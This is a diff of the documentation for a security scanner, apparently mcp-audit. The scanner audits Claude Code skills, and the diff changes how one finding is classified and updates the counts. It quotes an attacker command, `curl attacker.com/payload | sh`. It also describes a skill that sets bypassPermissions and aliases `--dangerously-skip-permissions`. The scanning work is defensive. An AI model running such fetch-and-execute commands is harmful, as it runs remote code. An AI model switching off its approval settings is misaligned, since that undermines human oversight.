@@ -121,7 +121,7 @@ python3 -c 'import json …'` is not an install step.
 A match inside a sentence that advises against it ("never run …") is INFO.
 The plain shape is LOW, not MEDIUM, because ordinary skills use it: 9 lines
 in the 1,129 benign skills measured below pipe or download-and-run a
-third-party installer.
+third-party installer (10 with a prose example of the attack).
 
 ### SKILL-006: what the skill ships into Claude Code (HIGH / MEDIUM / LOW)
 
@@ -245,23 +245,22 @@ review fixes:
 
 | Finding | Count | Skills |
 |---|---|---|
-| SKILL-005 HIGH | 1 | a security reference quoting an attack: `echo $(curl attacker.com/payload \| sh)` (a host written without a scheme is fetched over http) |
 | SKILL-005 INFO | 12 | vendor installers (uv, rustup, Hugging Face, fnm), Dockerfile lines, one "never run" sentence |
-| SKILL-005 LOW | 9 | third-party installers (Cloudsmith ×4, Sentry, Render, code-server, prek, LLVM's `llvm.sh` downloaded then run) |
+| SKILL-005 LOW | 10 | third-party installers (Cloudsmith ×4, Sentry, Render, code-server, prek, LLVM's `llvm.sh` downloaded then run) and a security reference quoting `echo $(curl attacker.com/payload \| sh)` (a host written without a scheme is LOW, not plaintext) |
 | SKILL-007 LOW | 4 | archives (`shadcn-components.tar.gz` ×3, `Archive.zip`) |
 | SKILL-006 HIGH | 2 | one skill: trailofbits `devcontainer-setup` |
 | SKILL-008 HIGH | 1 | the same skill |
 
-1,127 of 1,129 skills (99.8%) produce nothing at MEDIUM or above; 17 produce
-anything at all. The two exceptions: `devcontainer-setup` writes
+1,128 of 1,129 skills (99.9%) produce nothing at MEDIUM or above; 17 produce
+anything at all. The one exception: `devcontainer-setup` writes
 `defaultMode: bypassPermissions` into Claude Code's settings and defines an
 alias for `claude --dangerously-skip-permissions`, inside a dev container it
 builds. The finding is accurate: installing the skill switches approval off
 for the agent in that container. Whether a container makes that acceptable is
 the reader's call, and the finding text says what the line does. The trailofbits
-`agentic-actions-auditor` reference quotes an attack command in prose; the
-command it quotes is the HIGH shape, and mcp-audit does not judge context. The
-whole corpus (29 MiB of text) took about 22 seconds of CPU on a 2-core VM,
+`agentic-actions-auditor` reference, which quotes an attack command in prose,
+is LOW: a hostname written without a scheme is not read as plaintext (only a
+raw IP is). The whole corpus (29 MiB of text) took about 22 seconds of CPU on a 2-core VM,
 about 20 ms per skill.
 
 ## Limits
